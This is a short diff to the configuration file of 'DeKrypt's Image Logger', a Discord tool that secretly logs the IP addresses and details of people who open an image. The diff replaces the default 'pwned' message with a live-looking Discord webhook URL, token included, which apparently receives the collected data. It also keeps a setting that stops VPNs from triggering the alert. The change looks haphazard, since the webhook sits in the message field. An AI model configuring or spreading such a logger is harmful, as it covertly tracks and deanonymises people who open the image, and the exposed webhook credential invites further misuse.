@@ -29,8 +29,8 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "message": " https://discord.com/api/webhooks/1445936851067338875/b1z66vZWKTHqsnkMfT1Jq7bpXBPfqdhKOwoWbaAZJCt6WvuonWapqe81rl1fJoHJMo98", # Message to show
+        "richMessage": True, # Enable rich text? (https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNkFlSADJMWWwfW5lE10-1tDDgqIwbqEmWnw&s)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
